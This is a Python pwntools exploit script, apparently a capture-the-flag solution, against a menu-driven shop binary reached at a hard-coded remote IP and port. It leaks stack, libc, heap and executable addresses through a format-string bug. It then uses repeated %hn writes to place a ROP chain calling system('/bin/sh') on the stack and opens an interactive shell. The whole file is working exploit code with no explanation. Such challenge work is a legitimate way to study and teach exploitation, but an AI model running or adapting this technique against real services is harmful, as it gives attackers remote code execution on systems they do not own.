#!/usr/bin/env python3
from pwn import *
exe = ELF('pwnable_1_patched', checksec = False)
libc = ELF('libc.so.6', checksec=False)

# p = process(exe.path)
p = remote('103.197.184.48', 13331)

def buy(choice, quantity, data):
    p.sendlineafter(b'Input:', b'1')
    p.sendlineafter(b'(1)?:', choice)
    p.sendlineafter(b'quantity:', quantity)
    p.sendlineafter(b'(Y/N):', b'y')
    p.sendline(data)

def create_invoice():
    p.sendlineafter(b'Input:', b'2')

def change_gift(idx, data):
    p.sendlineafter(b'Input:', b'3')
    p.sendlineafter(b'label:', idx)
    p.sendafter(b'label:', data)

def change_addr(item, data):
    p.sendlineafter(b'Input:', b'4')
    p.sendlineafter(b'address:', item)
    p.sendlineafter(b'address:', data)

def sendPayload(idx, offset, i, x):
    buy(b'1', b'-1', b'a')
    payload = b'a'*64 + f'%{offset}c%{i}${x}'.encode()
    change_addr(idx, payload)
    change_gift(idx, b'\0'*10)
    create_invoice()

input()
# leak libc, stack, heap and exe
buy(b'1', b'-1', b'a')

payload = b'a'*64 + b'%10$p%15$p%8$p%11$p'
change_addr(b'1', payload)
payload = b'a'*10
change_gift(b'1', payload)
create_invoice()
p.recvuntil(b'65531|')

stack_leak = int(p.recv(14), 16) + 0x28
libc_leak = int(p.recv(14), 16)
libc.address = libc_leak - 0x29d90
heap_leak = int(p.recv(14), 16)
exe_leak = int(p.recv(14), 16)
exe.address = exe_leak - 0x1dc4
log.info("stack leak:" + hex(stack_leak))
log.info("libc leak:" + hex(libc_leak))
log.info("libc base:" + hex(libc.address))
log.info("heap leak:" + hex(heap_leak))
log.info("exe base:" + hex(exe.address))

# over write
pop_rdi = 0x2a3e5 + libc.address
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym.system

# overwrite rip -> pop_rdi
package1 = {
    (pop_rdi >> 0) & 0xffff: (stack_leak - 0x38) & 0xffff,
    (pop_rdi >> 16) & 0xffff: (stack_leak - 0x38 + 2) & 0xffff,
    (pop_rdi >> 32) & 0xffff: (stack_leak - 0x38 + 4) & 0xffff,
}
order1 = sorted(package1)

sendPayload(b'2', package1[order1[0]], 19, "hn")
sendPayload(b'3', order1[0], 49, "hn")
sendPayload(b'4', package1[order1[1]], 19, "hn")
sendPayload(b'5', order1[1], 49, "hn")
sendPayload(b'6', package1[order1[2]], 19, "hn")
sendPayload(b'7', order1[2], 49, "hn")

# /bin/sh
package2 = {
    (bin_sh >> 0) & 0xffff: (stack_leak - 0x30) & 0xffff,
    (bin_sh >> 16) & 0xffff: (stack_leak - 0x30 + 2) & 0xffff,
    (bin_sh >> 32) & 0xffff: (stack_leak - 0x30 + 4) & 0xffff,
}
order2 = sorted(package2)

sendPayload(b'8', package2[order2[0]], 19, "hn")
sendPayload(b'9', order2[0], 49, "hn")
sendPayload(b'10', package2[order2[1]], 19, "hn")
sendPayload(b'11', order2[1], 49, "hn")
sendPayload(b'12', package2[order2[2]], 19, "hn")
sendPayload(b'13', order2[2], 49, "hn")

# return 1
ret = exe.address + 0x1DDD
print(hex(ret))
package3 = {
    (ret >> 0) & 0xffff: (stack_leak - 0x28) & 0xffff,
    ((ret >> 16) & 0xffff): (stack_leak - 0x28 + 2) & 0xffff,
    (ret >> 32) & 0xffff: (stack_leak - 0x28 + 4) & 0xffff,
}
print(package3)
order3 = sorted(package3)

sendPayload(b'14', package3[order3[0]], 19, "hn")
sendPayload(b'15', order3[0], 49, "hn")
sendPayload(b'16', package3[order3[1]], 19, "hn")
sendPayload(b'17', order3[1], 49, "hn")
sendPayload(b'18', package3[order3[2]], 19, "hn")
sendPayload(b'19', order3[2], 49, "hn")

# return 2
print(hex(ret))
package3 = {
    (ret >> 0) & 0xffff: (stack_leak - 0x20) & 0xffff,
    ((ret >> 16) & 0xffff): (stack_leak - 0x20 + 2) & 0xffff,
    (ret >> 32) & 0xffff: (stack_leak - 0x20 + 4) & 0xffff,
}
print(package3)
order3 = sorted(package3)

sendPayload(b'20', package3[order3[0]], 19, "hn")
sendPayload(b'21', order3[0], 49, "hn")
sendPayload(b'22', package3[order3[1]], 19, "hn")
sendPayload(b'23', order3[1], 49, "hn")
sendPayload(b'24', package3[order3[2]], 19, "hn")
sendPayload(b'25', order3[2], 49, "hn")


# system
package4 = {
    (system >> 0) & 0xffff: (stack_leak - 0x18) & 0xffff,
    (system >> 16) & 0xffff: (stack_leak - 0x18 + 2) & 0xffff,
    (system >> 32) & 0xffff: (stack_leak - 0x18 + 4) & 0xffff,
}
order4 = sorted(package4)

sendPayload(b'26', package4[order4[0]], 19, "hn")
sendPayload(b'27', order4[0], 49, "hn")
sendPayload(b'28', package4[order4[1]], 19, "hn")
sendPayload(b'29', order4[1], 49, "hn")
sendPayload(b'30', package4[order4[2]], 19, "hn")
sendPayload(b'31', order4[2], 49, "hn")

#overwrite rip -> ret
sendPayload(b'32', (stack_leak - 0x40) & 0xffff, 19, "hn")
sendPayload(b'33', ret & 0xffff, 49, "hn")

p.interactive()